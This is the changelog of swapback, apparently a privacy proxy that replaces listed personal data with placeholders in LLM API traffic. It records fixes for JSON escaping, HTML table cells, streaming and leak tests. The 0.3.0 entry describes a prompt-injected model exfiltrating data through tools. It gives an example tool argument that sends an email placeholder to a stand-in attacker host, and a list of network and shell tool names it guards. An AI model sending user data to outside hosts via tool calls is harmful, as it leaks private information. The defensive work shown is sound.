# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project uses [Semantic Versioning](https://semver.org/).

## [0.4.13] - 2026-11-10

Fixes from independent re-check #13. One small code fix plus README number corrections; nothing else changed.

### Fixed
- **An email or phone number right after a Go-style escape was matched together with the escape's tail.** JSON
  written by Go (and others) escapes `<`, `>` and `&` as `\u003c`, `\u003e`, `\u0026`, so in
  `\u003ctd\u003ejo@example.com` the email detector took `u003ejo@example.com`. A listed email there was blocked
  (`503`) every time; an unlisted one reached the model as `\«EMAIL_n»`, which is not valid JSON, sometimes as two
  placeholders. No pattern match (email, phone, the Presidio and gitleaks patterns, custom patterns) may now start
  inside a `\uXXXX` escape or any other backslash escape, at any JSON level. Measured on 84 shapes (listed and
  unlisted emails and phones after `\u003e`, `\u0026`, `\u003c`, 1-3 levels): 0.4.12 swapped 60 exactly, blocked 15
  and sent 9 as broken JSON; 0.4.13 swaps all 84, restores them exactly, and every request stays valid JSON. Selftest
  and tests cover it (the new selftest line fails on 0.4.12: 34 of 48).
- **README: the streaming hold-back numbers for escaped JSON were overstated.** The earlier measurement counted the
  length difference between an escaped placeholder and its value as held back. Re-measured as what is truly held:
  up to about 20 characters at 2 levels and up to about 300 at 8 (about one escaped placeholder).
- **README: the slow streamed-restore numbers now give the measured range** from two test models (10 KB in 1-3 s and
  40 KB in 7-42 s at 2 levels; 10 KB in 0.3-18 s at 8), and the plain-text stream note no longer blames the test
  model's pacing.

### Known issues
- An ALL-CAPS listed name with a dotless `ı` (`İpek Yalçınkaya` written `İPEK YALÇINKAYA`) is blocked (`503`), not
  swapped. Fail-closed, nothing leaks.
- `scrub_timeout_s: .inf` is accepted and means no limit, like `0` or an empty value.

## [0.4.12] - 2026-11-10

Fixes from independent review #12. README corrections plus two small code fixes; nothing else changed.

### Fixed
- **README: the streaming hold-back sentence was not true for escaped JSON.** It said the restore holds back at most one
  partial placeholder (up to 24 characters) per stream. That holds for plain-text streams; a streamed reply whose text
  is itself escaped JSON is held back longer (measured: about 200 characters at 2 levels, about 15,000 at 8) and
  arrives in bursts. The text is unchanged either way; the sentence now says so with the numbers.
- **A non-numeric, negative or NaN `scrub_timeout_s` was accepted silently** (and the limit fell back to 10 s). It is
  now a one-line config error naming the file, and `swapback check-config` and `swapback-proxy` exit 2, like other
  bad settings. Selftest and tests cover `banana` and `-1`.

### Changed
- **A listed name split across markdown table cells is swapped, not blocked.** A ` | ` with blanks on both sides
  between a name's words now counts like a tab or one comma, so `| 7 | Penny | Crane |` and `Owners: Penny | Crane`
  are swapped and come back byte for byte (0.4.11 answered `503`, and the blocked text kept blocking later requests).
  A bar with no blank beside it (`|Penny|Crane|`) is still blocked. Measured on 1,100 generated markdown tables
  (half of them with the listed names' words in random cells, 100 inside JSON) and 400 shell pipelines: 0.4.11
  blocked 27 tables and touched nothing else; 0.4.12 swaps 23 of those 27 (the other 4 stay blocked, as before) and
  touches no chunk 0.4.11 left alone; every round trip exact.

### Documented (README Limits)
- Long streamed replies that are themselves escaped JSON are restored slowly (roughly quadratic in the reply size),
  and `scrub_timeout_s` does not cover the restore.
- One or two lines of a listed address on their own (the street line alone, street plus unit, unit plus city) are
  not swapped; list the street line separately to protect it.
- The config section says `scrub_timeout_s` covers the request check, not the restore.

## [0.4.11] - 2026-11-10

Fixes from independent review #11.

### Fixed
- **Dictionary-word names in one-word cells leaked 7 and 8 JSON levels down when the cells had quoted attributes**
  (review: 312 of 10,280 requests; raw, Go `\u003c` and PHP `<\/td>` HTML at level 8, Go-escaped at level 7). The
  cell rule read 300 characters of the text as written around the pair, and 8 levels down one quote is 255
  backslashes and the quote, so the tag before the name was out of reach. It now reads the context in the decoded
  view the pair was found in, so 300 characters are 300 decoded characters at every level the matcher reads (1-8).
  Repro: list `Heath Cliff`, send `<div dir="ltr">Heath</div><div dir="ltr">Cliff</div>` wrapped in
  `json.dumps({"v": ...})` 8 times: swapped, and the echo matches byte for byte.
- **Many copies of one listed value inside deeply nested JSON slowed down quadratically** (review: 8 levels, 50 KB in
  11 s, 100 KB in 44 s, 880 KB no answer in 90 s, and an abandoned request kept a CPU core busy). Finding the JSON
  level of each copy re-read the whole inner string from its start; it is now read incrementally (each character
  once per level), so 50 KB takes 2.2 s and 100 KB 4.1 s. New setting `scrub_timeout_s` (default 10, `0` = off): a
  request whose check takes longer is stopped and answered `503` with a one-line reason, and nothing is forwarded.
- **A name taken from table cells came back as broken HTML when the reply reused it after a different tag**
  (`<li>Heath</td><td class="last">Cliff</li>`, 36 of 126 reuse cases). The cells and their tags come back only where
  the same tag comes right before the placeholder as before the name as sent; after any other tag, the listed name.
- **A name split by one comma was blocked** ("Thanks Faith, Ridge trail opens at 9.", any CSV row holding a listed
  name), and the blocked message then blocked every later turn that carried it. One comma (spaces or tabs around it)
  now separates the words of a listed name, as a tab already did. A lower-case comma between ordinary words ("say
  grace, lee side") is still left alone. A comma followed by a line break and quoted CSV columns (`"Faith","Ridge"`)
  are still blocked; see the README's limits.
- **`i` + a combining dot (`i\u0307rem`, how Python lower-cases a capital dotted I) was blocked**; 0.4.9 swapped it.
  The combining dot after an i is now ignored.
- **An address quoted with `| ` at the start of each line was blocked**; `| ` now counts as a quote marker like `> `.

### Measured
- Review #11's scripts on copies, 0.4.10 → 0.4.11: leaks 144 of 7,200 → 0 and 168 of 3,080 → 0; exact round trips
  unchanged at 100%.
- False blocks on 2,318 fresh ordinary chunks (standard-library source, chat, HTML email tables in JSON, some with
  `> ` quotes): 0 on both. Prose with commas, 1,500 chunks built to put the listed names' words side by side in Title
  Case lists and CSV rows: 0.4.10 touched 7 and blocked 5, 0.4.11 touches 12 and blocks 0; the 5 that were blocked are
  now swapped, and no other chunk changed.
- Many copies 8 JSON levels down: review #10's 882 KB body 7.4 s and answered (0.4.10: no answer in 60 s).

## [0.4.10] - 2026-11-10

Fixes from independent review #10.

### Fixed
- **A restored value came back changed when an HTML tag with a quoted attribute sat between its parts** (review: 6 of
  6 targeted shapes, 27 of 1,296 layout replies, 43 of 200 menus with a listed pair). Inside a JSON string the span was
  kept as written, `\"` included, and the restore escaped it again for the JSON level, so `<div dir="ltr">` between
  the lines of a listed address came back as `<div dir=\\\"ltr\\\">`; the JSON still parsed, the bytes did not match.
  A value found in escaped JSON is now kept unescaped once per JSON level it sits in, and where the placeholder comes
  back at that same level the span returns exactly as it was written. Repro: list
  `27 Gallowgate Mews\nUnit 9\nBurlington, VT 05401` and send `json.dumps({"html": '<div dir="ltr">27 Gallowgate
  Mews</div><div dir="ltr">Unit 9</div><div dir="ltr">Burlington, VT 05401</div>'})`: the echo matches byte for byte.
  Side effect: a JSON-escaped value (`S\u00f8ren`) restored at the level it was sent at now comes back as written,
  not decoded (`Søren` where it is reused in prose); the 0.4.2 test that expected the decoded spelling was changed.
- **Dictionary-word names in one-word cells leaked when the HTML inside JSON was escaped** (review: 120 of 140 per
  encoding). The cell rule read the text around the pair as written, so `\u003ctd\u003e` (Go), `<\/td>` (PHP) and
  `&lt;td&gt;` (entities) never looked like cells. It now reads that text decoded, the way the matcher already reads
  the pair itself; the restore gives the escaped cells back exactly. Repro: list `Amber Lane`, send
  `json.dumps({"html":"<tr><td>Amber</td><td>Lane</td><td>Tucson</td></tr>"})` with `<`/`>` written as
  `\u003c`/`\u003e`.
- **A name swapped out of table cells came back with the tags between its words wherever the model reused it**
  ("Dear «PERSON_12»" became "Dear Amber</td><td>Lane"). A value that spans separate HTML blocks and had a tag right
  before it is now put back as written only where a tag comes right before the placeholder in the reply too; elsewhere
  the listed value comes back ("Dear Amber Lane", `"to_name": "Amber Lane"`). Streamed replies carry the text before
  the placeholder across chunks.
- **A listed name with a capital dotted I (Turkish `İ`) was blocked on every request.** Its lower case is two
  characters, so the matcher's key and the text never met while the re-check still saw the name. `İ` now lowers to
  `i` on both sides; the name is swapped, in Title Case, ALL-CAPS, lower case and inside JSON (escaped or raw).
- **An address quoted with `> ` at the start of each line was blocked.** The matcher also reads text with the quote
  markers removed (also inside JSON), so a quoted reply is swapped and restored as written.
- **Many copies of a listed value in one long JSON string slowed down quadratically** (review: 774 KB, no answer in
  150 s). Finding the JSON level of each placeholder re-read the whole string so far; a string that does not start like
  JSON is now known to be one level at once. 9,000 copies in one string: 88.6 s on 0.4.9, 0.4 s now.
- README: "byte-exact" says exactly which cases come back as the same value in another spelling; the cell rule names
  the escaped HTML it reads; the out-of-scope note gives a `{"first": "Amber", "last": "Lane"}` example; about 5,400
  lines (276 KB).

## [0.4.9] - 2026-11-10

Fixes from independent review #9.

### Fixed
- **A listed dictionary-word name split across one-word table cells or blocks still leaked in most real layouts**
  (review: 13 of 21 layouts leaked 18 of 18 requests, `<p>` blocks in an email 6 of 18). 0.4.8 swapped the pair only
  when the run of one-word blocks ended right there, so a third one-word cell (`Denver`, `CO`, `Manager`), a
  First/Last/City header row, a leading id or word cell (`Active`, `Owner`), pretty-printed rows, `class=` attributes,
  two data rows or three `<li>`/`<div>` items kept it as written. Now any two neighbouring one-word `<td>`/`<th>`/`<li>`/
  `<div>`/`<p>` blocks whose words are the listed name are swapped, wherever the pair sits in the row or list, whatever
  the attributes or whitespace; not across a row or list boundary. Measured on 1,580 ordinary one-word-block requests
  (menus, navigation, tables of ordinary words) without a listed pair: 0 touched before and after. A listed pair
  that appears as ordinary words (a menu `<div>Grace</div><div>Fields</div><div>Pricing</div>`) is now swapped; the
  0.4.7/0.4.8 tests that expected it left alone were changed.
- **The system note's example placeholders were real slots.** It showed `«PERSON_3»` and `«EMAIL_1»`, so a model
  that copied the example got a real listed person's name and email put into the reply. It now shows `«PERSON_0»`
  and `«EMAIL_0»`; slot numbers start at 1, so these are never assigned and come back as written.
- **A known file (or private terms file) with broken YAML said "Fix the path".** It now says the file is not valid
  YAML, with the line and column.
- README: what happens to a missing known file is stated exactly (the proxy refuses to start, exit code 2; a file
  that goes missing while it runs gets `503`s); the line count is now about 5,200 lines (260 KB).

## [0.4.8] - 2026-11-10

Fixes from independent review #8 against the launch bar.

### Fixed
- **Tool-call arguments with mixed escaping came back with invalid inner JSON** (review: 189 of 189 multi-line or
  tab-joined restores at 1 to 7 inner levels). When the outer level of the arguments is ASCII-escaped (`json.dumps`
  default) and the JSON inside it was written raw, the placeholder carries one backslash at any depth; the restore
  escaped the value by that count, so a newline came back one or more levels short. The value is now escaped for the
  JSON level it really sits in, read from the text around it (up to 16 levels), in plain and streamed replies; the
  streamed JSON state is carried across chunks. Repro: `json.dumps({"path": "a.json", "content":
  json.dumps({"address": "«ADDRESS_1»"}, ensure_ascii=False)})` with a three-line address now parses at both levels
  and matches byte for byte. An inner "document" that is prose starting with `[` or `{` no longer counts as a JSON level.
- **`\u00ab`-escaped placeholders in a text reply were never restored** (3 of 3 shapes: a ```json fence, inline JSON,
  two levels). They are now restored when they sit inside a JSON string, escaped for its level; outside JSON they are
  left as written.
- **A dictionary-word name split over one-word HTML blocks was sent** (0.4.7's no-join rule; review: 25 of 30 requests
  for `<td>Hazel</td><td>Woods</td>`, `<li>Hazel</li><li>Woods</li>`, `<div>Summer</div>\n<div>Lake</div>`). Blocks
  are joined again when each holds exactly one word, those words are the listed name and the run of one-word blocks
  ends there (a row or list boundary, or a neighbouring block that is not one more capitalised word, so a menu
  `<div>Grace</div><div>Fields</div><div>Pricing</div>` stays as written). Sentence ends and blank lines still break a name.
- **A bad `listen` value or a port already in use printed a traceback.** Both are now one readable line (exit 2).
- **The 503 for a run of 256 or more backslashes said "JSON nested deeper than 8 levels"**, which is not all it
  blocks; it now says what it blocks (a run of 256+ backslashes: JSON nested more than 8 levels deep, or a backslash
  nested 8 deep). The README says the same.

### Documentation
- README: line count measured (about 5,100 lines, 250 KB) and the same in the prose and the comparison table; the
  backslash rule, the config-error sentence, the restore depth and the one-word-block rule worded as they behave.

## [0.4.7] - 2026-11-10

Fixes from independent review #7 against the launch bar.

### Fixed
- **A value restored into JSON nested 5 to 8 levels deep came back one escape level short, so the innermost JSON was
  invalid** (a multi-line address or a tab-joined name in `json.dumps` of `json.dumps` ...; review: 256 broken restores
  of 21,952 replies, 12 of 16 cases at each depth from 5 to 8). The restore counted JSON string levels only up to 4
  while the matcher reads 8. It now escapes the value once per level it sits in, up to the same 8, in plain and
  streamed replies and in tool-call arguments (also for placeholders the model wrote ASCII-escaped). Repro
  (`nest(addr, k)`, k = 1..8): every level parses and the value is byte-exact.
- **A dictionary-word name was joined across a sentence end or separate HTML elements** ("Saving Grace. Fields of
  gold", `<div>Grace</div>\n<div>Fields</div>`, `<p>Grace</p><p>Fields</p>`, a blank line between the words): such
  text is now left as written, by the matcher and the egress re-check alike. A name split by a single `<br>` or an
  inline tag (`<b>Grace</b> Fields`) is still swapped, and so is any name that is not made of dictionary words.
- **A missing or broken config file printed a Python traceback.** The CLI and the proxy now print one line naming the
  file and the problem (not found, cannot be read, not valid YAML with the line and column, not a mapping) and exit 2.

### Security
- **A listed value nested 9 or more JSON levels deep was sent** (past the matcher's 8 levels; review: all 5 listed
  addresses and a tab-joined name went out with a `200`). A string whose escapes need more than 8 decodes (a run of
  256 or more backslashes) cannot be checked, so the request is now blocked with a `503`, before any decoding: a
  16-level body of about 1.3 MB answers at once (the review saw no answer within 30 s).

### Unchanged
- CamelCase names such as "RustyBanks" are still swapped as a listed name written glued (the 0.4.6 decision).

## [0.4.6] - 2026-11-10

Fixes from independent review #6 against the launch bar.

### Security
- **Later lines of a listed multi-line address leaked when its lines were joined by an HTML tag plus a line break
  inside JSON text** (`<br>\n`, `<br />\n`, `<br/>\r\n`, `</p>\n<p>` in a `json.dumps` tool result, an HTML mail body,
  tool-call arguments in the history; review: 32 of 120 leaked, 48 blocked). The street-address pattern swapped the
  street line first, so the listed value no longer matched whole. Now: HTML tags are read as line breaks in the
  decoded (escaped) views too, a listed value or private term claims its span before the pattern detectors (a pattern
  hit that cuts into one is dropped), and the egress re-check also reads each string with only listed values swapped,
  so a listed value a pattern swap cut into is blocked rather than sent. Review repro: 120/120 swapped, 0 leaked, 0
  blocked.
- **A listed value 4 JSON string levels deep leaked** (a literal `\n` inside JSON inside JSON inside JSON; 2 review
  requests). The matcher and the skeleton re-check now decode up to 8 levels (was 3 and 5); each level is a linear pass
  over shorter text.

### Fixed
- **Placeholders the model wrote ASCII-escaped inside a JSON string inside tool-call arguments were not restored**
  (`{"nested": "{\"a\": \"\\u00abPERSON_2\\u00bb\"}"}`; 50/50 in review #6, also in 0.4.4). Each extra JSON level
  doubles the backslashes; the restore reads the level from them and escapes the value for it, in OpenAI arguments,
  Anthropic `tool_use` input (plain and streamed) and Responses, so both JSON levels stay valid.

### Docs
- README: dictionary-word names match in Title Case only (the "or capitals" claim was not true by default; ALL-CAPS
  needs `common_names_all_caps: true`); package size corrected to about 4,750 lines (230 KB); escape depth 8 levels;
  tag-plus-line-break joins; selftest numbers for 0.4.6.
- `swapback selftest` adds a listed multi-line address with tag-plus-line-break joins (7 paths, json.dumps tool
  results, tool-call arguments in the history, a literal `\n` 4 levels deep) and doubly escaped tool-argument
  placeholders; tests/test_v046.py carries every review #6 repro.

### Not changed
- A CamelCase run of a listed dictionary-word name (`HunterStone`) is still swapped as the name: not matching it would
  open a leak for a name written as a handle, so it stays a known false swap.

## [0.4.5] - 2026-11-10

Fixes from independent review #5 against the launch bar.

### Security
- **A listed multi-word name written as several path segments leaked** (`Ngọc/Trâm/Vũ`, `/srv/Ngọc/Trâm/Vũ/file`,
  `/Users/First/Last/notes.txt`; 9 of 15,496 review requests). The "a name that is a path segment is left" exemption
  now applies only to a name that fits inside one segment (`/home/jane/`, `/home/Jane.Doe/`); a name spread over
  several segments is swapped, by the matcher and by the egress re-check, and the reply gets the path back as written.
- **Address lines joined by HTML tags went out whole** (`88 Main St<br>Apt 4<br>City`, `</p><p>`), and so did names
  with each part in its own tag (`<b>First</b> <b>Last</b>`). Matching and the skeleton re-check now also read HTML
  tags as line breaks / spaces; the span is restored exactly as written.

### Fixed
- **JSON inside a prose or markdown reply became invalid on restore.** A multi-line value (an address) restored into a
  string of a ```json fence, or of an object written inline in a sentence, came back with raw newlines (20/20 review
  cases), and pasted JSON with `\n` escapes came back unescaped (18/18). Each `{` or `[` in a prose reply now opens a
  JSON region (until its brackets close, or the first character JSON does not allow), and a value restored inside one
  of its strings is JSON-escaped, also when streamed. Elsewhere in prose values come back as written.
- **Large `%XX`, base64 or form-encoded bodies stalled the proxy** (48 KB of `%41` took 18 s, 180 KB 255 s; health did
  not answer meanwhile). The email pattern scanned every word boundary to the end of the run; it now runs only around
  each `@` (same matches, linear time). 200 KB bodies of `%XX`, base64, form data, entities or `@` runs: 0.1-0.7 s.
- **Health `known` counted written formats, not listed values** (45 listed values read 82: each phone counted once
  per format). `known` and `check-config`'s `known_by_type` now count unique listed values; `known_builtin` unchanged.

### Tests
- `swapback selftest` adds a name as path segments (`A/B/C`, `/Users/A/B/notes.txt`), `<br>`-joined addresses, JSON
  restored in a ```json fence, inline in prose and pasted with `\n` escapes, a 200 KB `%XX` body timed, and the health
  `known` count. `tests/test_v045.py` holds every review #5 repro.

## [0.4.4] - 2026-11-09

Fixes from independent review #4 against the launch bar.

### Security
- **A listed phone with letters glued on leaked** (`503-555-0147x22`, `...0193ext9`, `5035550147abc`,
  `Mob5035550147`), and so did a listed phone in a URL path with no host (`/u/5035550147/profile`). Letters before or
  after a listed phone's digits no longer hide it, a country code glued on without `+` is read as one, and phones,
  emails and IDs are never kept as "filesystem path segments" (only names are).
- **A hyphenated listed name written with a space or without the hyphen leaked** (`Ferrand-Moreau` as
  `Ferrand Moreau` or `FerrandMoreau`, also surname first). A hyphen inside a listed word is now interchangeable with
  any separator or with nothing. A multi-word name written glued in one run of letters (`inesferrandmoreau`) is matched.
- **The egress re-check is now structurally looser than the matcher.** Besides the matcher's own rules it runs a
  skeleton check: each outgoing string and its decoded views (5 levels) reduced to letters and digits (accents
  stripped, NFKD, zero-width and soft hyphens removed, `[at]`/`[dot]` dropped), searched for each listed value's
  skeleton with loose edges, and for each listed phone's national digits in any digit run joined by up to 3
  non-letters. Anything the matcher left that it finds blocks the request (`503`). On the maintainer's holdout the
  re-check alone (swap off) saw 792/1,128 forms on 0.4.3 and 1,128/1,128 on 0.4.4; 0 false blocks on 1,743 chunks of ordinary text.
- **A request with a lone `%XX` continuation byte (`caf%A0`, `%BF`) hung its proxy thread forever** at full CPU
  (decoded-view loop did not advance; since 0.4.2). It is now kept as written.

### Fixed
- **Health said `ok` while every request was blocked** because the known file was deleted, unreadable or broken while
  the proxy ran. It now reports `"status": "blocked"`, `"ok": false` with the reason in `warnings` (`swapback health`
  exits 1) and returns to `ok` once a good file is read.
- **A multi-line value restored into JSON inside JSON broke the inner JSON** (`json.dumps(json.dumps(...))` echoed
  back). The restore now escapes once per string nesting level (up to 4), in whole replies, streams and tool-call
  arguments.
- **ALL-CAPS headings were swapped** ("CAROL SINGER WANTED" for a listed "Carol Singer"). Names made only of
  dictionary words now match in Title Case only; ALL-CAPS needs `common_names_all_caps: true`.
- `swapback --help | head` (and `swapback-proxy --help | head`) no longer ends with a `BrokenPipeError` traceback.
- Health and the start line report `"known"` as your listed values (an empty list reads 0, not 2); the two built-in
  canary values are `"known_builtin"`. During a held shrink the count matches the warning.
- README: the comparison table's "Encoded spellings" row had 5 of 7 cells; the safety-check description now says
  exactly what is checked and what is out of scope.

### Tests
- `swapback selftest` covers every review #4 repro (glued extensions, `Mob` prefix, host-less URL paths, hyphen
  variants, ALL-CAPS headings, JSON-in-JSON multi-line restore, health while the file is deleted and broken) and
  reports the skeleton layer alone. `tests/test_v044.py` adds unit tests for each.

## [0.4.3] - 2026-11-09

Fixes from independent review #3 against the launch bar.

### Security
- **Listed values leaked when spaces were written as `+`** (URL query strings and HTML form bodies, `?q=Jane+Doe`,
  what Python's `urllib.parse.quote_plus` writes), in plain text, tool results and tool-call arguments, and the egress
  re-check missed them too. `+` and `/` now separate the words of a listed value in matching and in the re-check
  (`%2B`/`%2F` are decoded first), and `+` may join the digit groups of a listed phone.
- **Decomposed accents (NFD), zero-width characters inside a word and fullwidth digits or letters** are now matched:
  matching and the egress re-check also read a normalized view of every string, and of every decoded view (NFC,
  zero-width characters removed, fullwidth ASCII folded). Hits map back to the span as written; plain-text forms still
  round-trip byte for byte.
- Accent-free variants now also transliterate letters NFKD does not split (`ø`→`o`, `ł`→`l`, `æ`→`ae`, `ß`→`ss`, ...).

### Fixed
- **A value restored inside a JSON reply broke the JSON** (a multi-line address in JSON mode came back with a raw
  newline inside a string). In a reply that is a JSON document (first character `{` or `[`), a value restored inside a
  string is JSON-escaped: quotes, backslashes and control characters (`é` stays as it is). Works across stream chunks.
- **Ordinary sentences no longer trip names made of dictionary words.** Title-Case-only matching (0.4.2) now covers any
  listed name of two or more words that are all English dictionary words ("Drew Wells", "Jack Frost", "Gene Pool"),
  using a shipped word list (SCOWL size 50, 64k words, gzipped), not just the short common-phrase list. A comma between
  two ordinary lower-case words ("say grace, lee side") no longer joins a surname-first name.
  `common_names_title_case: false` still matches them in any case.
- A missing or unreadable known file at startup prints one line (`swapback: error: configured file is missing: …`) and
  exits 2, with no traceback (`swapback-proxy`, `swapback stats`, `check-config`, `scrub-file`).
- `swapback health` exits 1 when the proxy is not ok (blocked, warning, unreachable).

### Changed
- `"Jane/Doe"` now matches a listed "Jane Doe" (it was treated as two names). A listed name that spans several
  segments of a filesystem path (`/home/jane/doe/…`) is still left alone.
- `swapback selftest` adds the encoded forms (`quote_plus`, `+`/`/`, NFD, zero-width, fullwidth), two dictionary-word
  names with traps, and an egress-only pass (swap switched off: the re-check must see every form). `%XX`-encoded forms
  are scored as "back as the same value, decoded" rather than byte-exact. 0.4.3: 33/33 caught, 0 of 1,281 forms leaked,
  549/549 seen by the re-check alone, 51/51 sentences untouched, 1,183/1,183 exact round trips.
- README: positioning and the comparison table corrected against Veil's current README (Veil also keeps real values
  from unknown and network tools, fails closed with a second guard, and has a transform-bypass suite); encodings
  covered and out of scope listed exactly; why the tool default stays `restore`.

## [0.4.2] - 2026-11-09

Fixes from an independent re-review against the launch bar.

### Security
- **Listed values with non-ASCII letters leaked when the text around them was JSON-escaped.** Python's `json.dumps`
  writes `Søren` as `S\u00f8ren`, so a listed accented name inside a tool result (OpenAI `tool`, Anthropic
  `tool_result`, Responses `function_call_output`) or in tool-call arguments kept in the history went to the provider
  as written, and the egress re-check missed it. swapback now also matches the decoded form of escaped text
  (`\uXXXX` in any hex case and surrogate pairs, `\xXX`, `\n` and the other JSON escapes, HTML entities such as
  `&oslash;` and `&#248;`, `%XX` runs, JSON inside JSON up to three levels) and swaps the escaped span it came from.
  The restore gives back the decoded spelling.
- **The egress re-check decodes the same escapes before checking**, so a listed value the swap misses in any spelling
  the model could decode blocks the request (`503`) instead of leaving.
- **A listed address written over two lines or without its comma** (`17 Example Mews\nDublin …`) is now matched:
  commas, semicolons and newlines separate the parts of listed values that are not names.

### Changed
- **Listed names that are also ordinary phrases** ("Will Hunt", "Rose Marsh") are matched only when every word is
  capitalised (`Will Hunt`, `WILL HUNT`, `Hunt, Will`), so "I will hunt for the keys" is left untouched. Set
  `common_names_title_case: false` for the old any-case matching. `check-config` still lists these names (line numbers,
  never values) and says which way they are matched.

### Added
- `swapback selftest` (`--json`): a reproducible leak test with made-up data shipped in the package. It sends 31 listed
  values in 90 written forms through 7 request paths to a recording fake model and prints listed values caught, forms
  leaked, ordinary sentences untouched, exact round trips and the unlisted catch rate. Exit code 0 on PASS. The README
  publishes its numbers.
- README: leads with the tool-call exfiltration threat and the `swapback demo` output, a "Use alongside LiteLLM or an
  NER tool" section, and comparison rows for the tool-call egress policy, Responses streams, fail-closed guards and a
  public leak test.

### Fixed
- A sharp shrink of the known file prints a warning line on stderr, and `/scrubber/health` reports
  `"status": "warning"` and `"ok": false` while the previous values are still being protected (`"status"` is `"ok"`,
  `"warning"` or `"blocked"`).
- `swapback check-config` exits with code 2 when the known file has no values (and `allow_empty_known` is not set).

## [0.4.1] - 2026-11-09

Fixes from an independent pre-launch review.

### Security
- **Listed phone numbers outside the US were sent unchanged.** A listed number with 10 digits, such as `98765 43210`
  (India) or `0412 345 678` (Australia), was expanded only into US formats and lost the form as written, so it went to
  the provider as written and the "known value still present" egress check missed it too. Now a listed phone is
  matched as written, by its bare digits, and by a digit matcher that finds the same national number in any grouping,
  with or without a country code or trunk 0 (`+91-98765-43210`, `(04) 1234 5678`). US formats are added only for
  numbers that are actually US. The egress re-check uses the same matcher, so a listed phone left anywhere in a
  request blocks it.
- **An empty or truncated known file no longer silently protects nothing.** A configured known file with no values
  blocks every request (`allow_empty_known: true` to allow it). A reload that finds the file empty or less than half
  its previous size keeps protecting the previous values too, alerts and shows a warning in `/scrubber/health`; at
  start, a file under half its size at the last start is flagged the same way.
- The known file and the config are re-read on any content change (mtime, size, inode or ctime, then a content hash),
  so a save by rename that keeps the old mtime is picked up.

### Added
- `swapback demo`: a built-in fake model plus the proxy, with made-up data and no config, key or network. It shows a
  plain, a streamed and a tool-call request: what the app sent, what the model saw, what came back. It is now the
  README's first step instead of the clone-only quickstart.
- Blocked requests answer in the client API's error shape (OpenAI or Anthropic) with a readable reason and the header
  `X-Swapback-Blocked`, and print one line on stderr. `/scrubber/health` has `warnings` and reports `ok: false` while
  an empty known file blocks requests.
- Listed names also match surname first (`Doe, Jane`) and without accents; listed IDs also match without their spaces
  and dashes. Variants share the value's placeholder and restore as written.
- Warnings in `swapback check-config`, the proxy's start line and `/scrubber/health`: example values from `swapback
  init` still in the known file, and listed names that are ordinary phrases (`Will Hunt` / "I will hunt"), by line
  number, never by value. `check-config` also notes listed phones that are not US numbers.

### Changed
- README: the `phone_regions` setting is explained (it is for the pattern detector, not for listed numbers).

## [0.4.0] - 2026-11-09

### Added
- **Hooks.** A `hooks:` section in `swapback.yaml` names a Python module (or a `.py` file, or a `swapback.hooks`
  entry point) whose optional functions run around each request: `before_forward` (reroute, change the body or
  headers, or answer directly), `on_upstream_response` (the upstream answered an error or was unreachable: try another
  route once), `on_usage` (each JSON reply and SSE event, for spend tracking), `on_complete`, `extra_routes` (extra GET
  endpoints) and `alert` (deliver alerts yourself). Hooks only ever see scrubbed requests and unrestored replies, so
  placeholders, never real values; rerouted and locally answered replies are restored like any other. Exceptions in
  `before_forward` and `on_upstream_response` fail closed with a 503. Use it for a spend cap with a local-model
  fallback, usage accounting or a health endpoint; see the README's "Hooks" section.
- `/scrubber/health` reports the hooks module and `hook_errors`; `swapback check-config` lists the hook functions.
- `swapback init` writes a starter `swapback.yaml`, `known.yaml` and `private_terms.example.yaml` (0600) from example
  files now shipped inside the package, so `pip install swapback` users have them; it never overwrites without
  `--force`.

### Changed
- README comparison table: the tool-call row now describes the `tool_restore` policy (it still said every tool got
  real values, the 0.2 behaviour), streaming lists the Responses API, and piighost and Kiji Privacy Proxy are added
  (claims from their own READMEs; "Unclear" where they do not say).
- README "Framework recipes": example `tool_restore` lists for OpenClaw, Claude Code, Codex CLI and a strict generic
  setup. Config only; swapback has no framework-specific code.

## [0.3.0] - 2026-11-09

### Security
- **Tool calls that could send data out keep their placeholders.** Until now the real values were restored into every
  tool call's arguments, so a prompt-injected model could ask a web or shell tool to send them anywhere, e.g.
  `{"url": "https://evil.example/c?d=«EMAIL_1»"}`. A new restore policy, `tool_restore` in `swapback.yaml`, keeps
  placeholders for tools whose names look like network or shell egress (`web_fetch`, `WebFetch`, `Bash`,
  `exec_command`, `http_request`, `send_email`, `git_push`, ...) and for any call with a URL in its arguments. `allow`
  lists tools that always get real values, `deny` tools that never do, `default: keep` keeps placeholders everywhere
  except allowed tools, and `tool_restore: false` restores everything as before. Applied to plain JSON replies, OpenAI
  chat streams and Anthropic `tool_use` blocks and streams. A streamed call whose name does not decide is held until
  it is complete. Each kept call is counted as `tool_kept` in `requests.jsonl` (a count, never a value), and
  `swapback check-config` shows the policy. See the README's "Tool calls" section.
- The top-level `user` field is now scrubbed (it was skipped, with only a known-value check). `metadata`,
  `instructions`, `safety_identifier` and other free-text fields were already scrubbed; tests now cover them.

### Added
- `swapback known init` builds or extends `known.yaml` from a vCard export (2.1, 3.0, 4.0), a CSV (Google and Outlook
  contact exports, any name/email/phone/address columns, or value,type rows) and other known files. It merges without
  duplicates (case, spacing and phone formats), writes the file `0600`, skips one-word contacts that are relations or
  everyday words, and prints counts only (`--show` for values, `--dry-run` to write nothing). `--scan` reads past
  prompts (text or JSONL) and writes candidate names, emails and phones to a separate `known.suggestions.yaml` for
  review; suggestions are never merged on their own. Standard library only.

- OpenAI Responses API streams (`/v1/responses` with `stream: true`, as used by Codex) are restored: `output_text`,
  refusal and reasoning deltas with the same split-placeholder handling as chat completions,
  `function_call_arguments` and `custom_tool_call_input` deltas under the tool restore policy, and the `.done`,
  `output_item.*`, `content_part.*` and `response.completed` snapshots. A held-back piece is sent as one more delta
  before the matching `.done` event, and `sequence_number`s are shifted so they stay unique and increasing. Codex's
  `local_shell_call` always keeps placeholders.
- PyPI packaging: `python -m build` makes a clean sdist (with tests and fixtures) and wheel that pass
  `twine check --strict`; CI checks this on every push. A `release` workflow builds and tests the wheel on a `v*` tag
  and publishes with PyPI Trusted Publishing once the repository variable `PYPI_PUBLISH` is `true`. Not published yet.

### Changed
- The "keep placeholders as written" system note now also reaches requests without a system message (a system message
  is added, but only when the request carries placeholders), a system or `developer` message with content parts,
  Anthropic's top-level `system` (string or blocks; a block is appended after any `cache_control` block) and the
  Responses API `instructions`. Before, it was only appended to a string system message.
- The proxy tells the scrubber which API a request is for (`/v1/messages` = Anthropic, `/v1/responses` = Responses)
  so the note goes in the right place.

- Package metadata: SPDX `license = "MIT"` with `license-files` (setuptools 77 or newer to build), vendor rule
